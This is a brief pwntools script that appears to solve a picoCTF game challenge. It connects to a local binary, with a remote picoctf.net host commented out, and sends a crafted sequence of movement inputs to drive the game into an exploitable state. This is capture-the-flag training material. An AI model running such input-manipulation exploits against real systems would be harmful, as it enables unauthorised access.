from pwn import *

r = process("./game")
HOST, PORT = "saturn.picoctf.net 51033".split()
# r = remote(HOST, PORT)

for i in range(4):
    r.sendline(b"a")
    r.sendline(b"w")
r.sendline(b"a" * 4)
r.sendline(b"p")

r.interactive()
